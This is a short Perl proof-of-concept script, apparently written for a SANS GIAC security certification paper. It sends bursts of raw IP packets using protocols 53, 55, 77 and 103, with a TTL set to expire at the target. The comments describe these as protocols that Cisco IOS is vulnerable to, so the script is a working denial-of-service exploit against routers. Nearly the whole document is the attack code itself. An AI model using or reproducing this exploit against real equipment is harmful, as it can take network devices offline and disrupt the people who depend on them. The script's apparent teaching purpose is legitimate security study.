#!/usr/bin/perl
# https://www.giac.org/paper/gsec/3602/practical-perl-security-practitioners/105856
# This source code is original source code written by Holt Sorenson
# for the SANS GIAC GSEC practical, v1.4b Option 1.
# It was written using PERL 5.8.0 on Debian GNU/Linux 3.0.
use Net::RawIP;
$tp = new Net::RawIP;
# swipe, ip mobility, sun nd, pim
@protos = qw( 53 55 77 103 );
# the outer loop runs 4 times, the inner loop runs 19 times
# this results in 76 packets being sent to the remote host
$otimes = 4;
$itimes = 19;
$pindex = 0;
while ($otimes > 0)
{
 $itimes = 19;
 while ($itimes > 0)
 {
$tp -> set(
 {
 ip =>
 {
 saddr => '192.168.127.1',
 daddr => '192.168.127.1',
 # the outer loop increments $pindex
 # causing each iteration of
 # the inner loop to use one of the four
 # protocols that IOS is vulnerable to
 protocol => $protos[$pindex],
 # the ttl needs to be set to expire (reach
 # zero) at the target
 ttl => 0
 }
 }
 );
$tp -> send;
$itimes--;
 }
 $otimes--;
 $pindex++;
}
